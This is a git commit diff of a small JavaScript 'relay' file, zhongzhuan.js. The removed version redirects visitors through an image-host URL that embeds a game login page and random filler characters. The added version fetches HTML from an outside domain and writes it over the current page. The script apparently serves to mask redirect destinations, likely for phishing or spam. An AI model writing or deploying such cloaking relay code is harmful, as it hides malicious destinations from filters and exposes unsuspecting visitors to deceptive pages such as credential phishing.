3ca4481181965b128b5ddd4cbe0929cf789aed61
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-03-18 19:30:09 +0800

    Update zhongzhuan.js

--- zhongzhuan.js
+++ zhongzhuan.js
@@ -1,16 +1,20 @@
-var urls=[
-' http://xiuxiu-pro.meitudata.com/ai_quality/8dfb838f90a030c87085977e4e0cecfa.png#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html{nnnnnnn}{wwww}',];
-location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
-function myEeplace(s){
-	return s.replace(/\{(\w+?)\}/g,function(a,b){
-		var h='';
-		for(var i=0;i<b.length;i++){
-			if('n'==b[i]){
-				h+=Math.floor(Math.random()*10);
-			}else if('w'==b[i]){
-				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
-			}
-		}
-		return h;
-	});
+function loadhtml(url){ 
+ var xhr = new XMLHttpRequest;
+ var html = null;
+ function render() {
+  var a = document.open("text/html", "replace");
+  a.write(html);
+  a.close();
+ }
+ xhr.onload = function () {
+  html = xhr.responseText;
+  var delay = 0;
+  if (delay > 0) setTimeout("render()", delay * 1000)
+  else render();
+ };
+ xhr.open("GET", url, !0);
+ xhr.send(); 
 }
+
+
+ loadhtml('https://x.e9u.cn/html/dljzdy.html');
